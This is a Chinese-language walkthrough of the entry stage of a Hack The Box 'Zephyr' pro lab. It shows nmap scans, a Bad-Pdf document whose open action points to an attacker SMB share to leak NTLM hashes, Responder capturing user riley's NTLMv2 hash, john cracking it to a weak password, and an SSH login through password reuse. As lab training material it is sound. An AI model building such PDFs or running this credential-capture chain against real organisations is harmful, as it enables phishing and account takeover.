# Zephyr
## 场景描述
## 10.10.110.0/24(nmap)
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop]
└─# nmap 10.10.110.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 08:01 CST
Nmap scan report for bogon (10.10.110.2)
Host is up (0.40s latency).
All 1000 scanned ports on bogon (10.10.110.2) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for painters.htb (10.10.110.35)
Host is up (0.27s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 256 IP addresses (2 hosts up) scanned in 87.62 seconds
```
### 10.10.110.35(入口机、网卡一\riley)
详细版本扫描
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop/Bad-Pdf]
└─# nmap -sV -sC -p22,80,445 10.10.110.35
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 08:55 CST
Nmap scan report for painters.htb (10.10.110.35)
Host is up (0.20s latency).

PORT    STATE    SERVICE      VERSION
22/tcp  open     ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ca:e7:7e:99:03:a9:78:e8:86:2e:e8:cc:2b:9f:08 (RSA)
|   256 b1:7f:c0:06:9b:e7:08:b4:6a:ab:bd:c2:96:04:23:49 (ECDSA)
|_  256 0d:3b:89:bc:d5:a4:35:e0:dd:c4:22:14:7a:48:ad:7c (ED25519)
80/tcp  open     http         nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://painters.htb/home
445/tcp filtered microsoft-ds
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::warning 
因为访问10.10.110.35浏览器会自动解析成`https://painters.htb/home`导致不能连接服务器，所以我们必须把域名和ip绑定，即hosts  -> 10.10.110.35 painters.htb
:::
vacancies
![alt text](../../../images/dcd974d1753777a23a684d4dcedd47d4.png)
发现可以上传pdf
![alt text](../../../images/892ca35c0c7e15202d018de3551cb2a5.png)
:::tip 
经过Lamber提醒，所以知道bad-pdf钓鱼方法进行攻击
:::
#### 制作badpdf
GitHub寻找项目`https://github.com/deepzec/Bad-Pdf`
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop/Bad-Pdf]
└─# cat hf.pdf                                                

%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
           /O <<
              /F (\\\\10.10.14.9\\test)
                  /D [ 0 /Fit]
                  /S /GoToE
                  >>

           >>

           /Parent 2 0 R
           /Resources <<
                        /Font <<
                                /F1 <<
                                        /Type /Font
                                        /Subtype /Type1
                                        /BaseFont /Helvetica
                                        >>
                                  >>
                                >>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj


trailer
<<
        /Root 1 0 R
>>

%%EOF

```
:::note
本质是hr在带有老版本的adobe域内点击了badpf，导致NTLMv2-SSP Hash发送到`\\\\10.10.14.9\\test`,所以我们开始监听就好了
:::
```python
player@HTB-pro-labs:~$ sudo /root/github/Responder/Responder.py -I tun0 -F -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.9]
    Responder IPv6             [dead:beef:2::1007]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-MHEQOF5VP8L]
    Responder Domain Name      [PO9L.LOCAL]
    Responder DCE-RPC Port     [48062]

[+] Listening for events...

[!] Error starting SSL server on port 5986, check permissions or other servers running.
[!] Error starting SSL server on port 443, check permissions or other servers running.
[!] Error starting SSL server on port 636, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.110.35
[SMB] NTLMv2-SSP Username : PAINTERS\riley
[SMB] NTLMv2-SSP Hash     : riley::PAINTERS:53c64658d8d385f2:D5400AE66AF0FEAA810A5BA5D28C2E3F:010100000000000080D5D41498B5DA015CFAE691A8785C93000000000200080050004F0039004C0001001E00570049004E002D004D004800450051004F00460035005600500038004C0004003400570049004E002D004D004800450051004F00460035005600500038004C002E0050004F0039004C002E004C004F00430041004C000300140050004F0039004C002E004C004F00430041004C000500140050004F0039004C002E004C004F00430041004C000700080080D5D41498B5DA01060004000200000008003000300000000000000000000000002000009362064276D8FE84BF59334519405635765FD93A3A806E37B16B1DF51AF65E190A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0039000000000000000000
```
拿到hash的时候第一时间就想到爆破
```python
┌──(rookie㉿Rookie)-[~/Desktop]
└─$ john aaa -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd         (riley)     
1g 0:00:00:00 DONE (2024-06-03 17:56) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
:::danger 问题
```
1、在Linux的web网页，为什么会反弹出NTLMv2-SSP Hash 
2、为什么Linux用NTLMv2-SSP Hash的账户密码登陆
```
:::
:::tip 回答
```
1、web网页只负责收集pdf，而hr工作的地方是Windows环境，hr在域内点击查看
2、密码复用，是域内很常见的攻击方法
```
:::
尝试登陆
```python
┌──(root㉿Rookie)-[/home/rookie/Desktop/Bad-Pdf]
└─# ssh riley@10.10.110.35 
riley@10.10.110.35's password: P@ssw0rd

riley@mail:~$ ls
agent  flag.txt  nmap 
riley@mail:~$ cat flag.txt 
ZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}  #人类的错误是致命的
```

